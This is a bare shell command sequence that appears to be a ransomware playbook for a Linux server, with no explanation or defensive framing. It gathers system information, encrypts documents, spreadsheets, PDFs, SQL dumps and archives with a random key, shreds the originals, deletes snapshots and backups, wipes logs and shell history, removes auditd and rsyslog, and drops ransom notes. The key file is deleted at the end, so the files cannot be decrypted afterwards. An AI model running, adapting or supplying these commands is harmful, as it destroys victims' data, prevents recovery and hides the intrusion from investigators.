whoami
id
uname -a
cat /etc/os-release
ls -la /root
find /home /srv /var/www /var/lib/mysql -type f \( -name "*.doc*" -o -name "*.xls*" -o -name "*.pdf" -o -name "*.sql" -o -name "*.tar.gz" \) 2>/dev/null | wc -l
KEY=$(openssl rand -hex 32)
echo "$KEY" > /tmp/k
find /home /srv /var/www /var/lib/mysql -type f \( -name "*.doc*" -o -name "*.xls*" -o -name "*.pdf" -o -name "*.sql" -o -name "*.tar.gz" \) -exec openssl enc -aes-256-cbc -salt -pbkdf2 -pass file:/tmp/k -in {} -out {}.locked \; -exec shred -u {} \;
find / -name "*.snapshot*" -exec rm -rf {} \; 2>/dev/null
btrfs subvolume list / 2>/dev/null | awk '{print $NF}' | xargs -I{} btrfs subvolume delete "/{}" 2>/dev/null
rm -rf /var/backups/* /var/lib/postgresql/backup/* 2>/dev/null
journalctl --rotate
journalctl --vacuum-time=1s
truncate -s 0 /var/log/auth.log /var/log/syslog /var/log/kern.log /var/log/wtmp /var/log/btmp /var/log/lastlog
cp /dev/null /var/log/nginx/access.log
systemctl stop auditd rsyslog
systemctl mask auditd rsyslog
apt -y remove --purge auditd rsyslog
cp /tmp/README_RESTORE_YOUR_FILES.txt /README_RESTORE_YOUR_FILES.txt
for d in /home/*/Documents /home/*/Desktop /root /var/www; do cp /tmp/README_RESTORE_YOUR_FILES.txt "$d/" 2>/dev/null; done
rm /tmp/k /tmp/README_RESTORE_YOUR_FILES.txt
history -c
